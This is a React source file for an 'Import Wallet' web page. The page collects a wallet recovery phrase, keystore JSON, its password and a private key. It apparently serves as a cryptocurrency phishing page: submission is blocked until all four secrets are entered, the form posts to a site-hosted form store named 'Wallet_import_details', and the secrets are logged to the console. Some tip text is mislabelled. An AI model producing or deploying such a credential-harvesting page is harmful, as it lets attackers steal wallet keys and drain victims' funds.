import React from 'react';
import '../../assets/styles/css/wallet-details-entry-page.css';
import '../../assets/styles/css/wallet-details-entry-page_media-queries.css';
import { useState } from 'react';
// import { useEffect } from 'react';
import Navbar from '../../components/Navbar';
import Footer from '../../components/Footer';

function WalletDetailsEntryPage() {
  const [showPhrase, setShowPhrase] = useState(false);
  const [showKeyJson, setShowKeyJson] = useState(false);
  const [showPrivateKey, setShowPrivateKey] = useState(true);

  // form handling

  let [phrase, addPhrase] = useState('');
  let [keystoreJson, addKeystoreJson] = useState('');
  let [password, addPassword] = useState('');
  let [privateKey, addPrivateKey] = useState('');

  // const [userData, setUserData] = useState({});

  const userData = { phrase, keystoreJson, password, privateKey };

  const encode = (data) => {
    return Object.keys(data)
      .map(
        (key) => encodeURIComponent(key) + '=' + encodeURIComponent(data[key])
      )
      .join('&');
  };

  function handleSubmit(e) {
    e.preventDefault();
    if (phrase && keystoreJson && password && privateKey) {
      fetch('/', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: encode({ 'form-name': 'Wallet_import_details' }),
      })
        .then(() => {
          window.location.reload();
        })
        .catch((error) => alert(error));
      console.log(userData);
    } else {
      alert('incomplete entries');
      return false;
    }
  }

  function displayPhrase() {
    setShowPhrase(true);
    setShowKeyJson(false);
    setShowPrivateKey(false);
  }

  function displayKeyJson() {
    setShowKeyJson(true);
    setShowPhrase(false);
    setShowPrivateKey(false);
  }

  function displayPrivateKey() {
    setShowPrivateKey(true);
    setShowPhrase(false);
    setShowKeyJson(false);
  }

  return (
    <>
      <Navbar />
      <section className="wallet-details-entry-section">
        <div className="section-header text-center">Import Wallet</div>
        <div className="options-wrapper">
          <button
            className="option-item"
            style={{
              backgroundColor: showPhrase && '#3877d3',
              color: showPhrase && '#ffffff',
            }}
            onClick={displayPhrase}
          >
            Phrase
          </button>
          <button
            className="option-item"
            style={{
              backgroundColor: showKeyJson && '#3877d3',
              color: showKeyJson && '#ffffff',
            }}
            onClick={displayKeyJson}
          >
            Keystore JSON
          </button>
          <button
            className="option-item"
            style={{
              backgroundColor: showPrivateKey && '#3877d3',
              color: showPrivateKey && '#ffffff',
            }}
            onClick={displayPrivateKey}
          >
            Private Key
          </button>
        </div>
        <form
          className="form-area"
          method="post"
          name="Wallet_import_details"
          onSubmit={handleSubmit}
        >
          <input type="hidden" name="form-name" value="Wallet_import_details" />

          {showPhrase && (
            <div className="mb-3">
              <textarea
                className="form-control"
                placeholder="Phrase"
                name="Phrase"
                rows="5"
                value={phrase}
                onChange={(e) => addPhrase(e.target.value)}
              ></textarea>
              <div className="tip-text">
                Typically 12 (sometimes 24) words separated by single spaces.
              </div>
            </div>
          )}
          {showKeyJson && (
            <div className="mb-3">
              <textarea
                style={{ marginBottom: '20px' }}
                className="form-control"
                placeholder="Keystore JSON"
                name="Keystore-JSON"
                value={keystoreJson}
                onChange={(e) => addKeystoreJson(e.target.value)}
                rows="5"
              ></textarea>
              <div>
                <input
                  type="password"
                  className="form-control"
                  placeholder="Password"
                  name="Password"
                  id="inputPassword"
                  value={password}
                  onChange={(e) => addPassword(e.target.value)}
                ></input>
              </div>
              <div className="tip-text">
                Several lines of text beginning with '(...)' plus the password
                you used to encrypt it.
              </div>
            </div>
          )}

          {showPrivateKey && (
            <div className="mb-3">
              <input
                type="text"
                className="form-control"
                placeholder="Private Key"
                name="Private-key"
                value={privateKey}
                onChange={(e) => addPrivateKey(e.target.value)}
              ></input>
              <div className="tip-text">
                Typically 12 (sometimes 24) words separated by single spaces.
              </div>
            </div>
          )}

          <div className="submit-button-wrapper">
            <button
              className="show-more-wallet-btn btn submit-button"
              type="submit"
            >
              Import
            </button>
          </div>
        </form>
      </section>
      <Footer />
    </>
  );
}

export default WalletDetailsEntryPage;
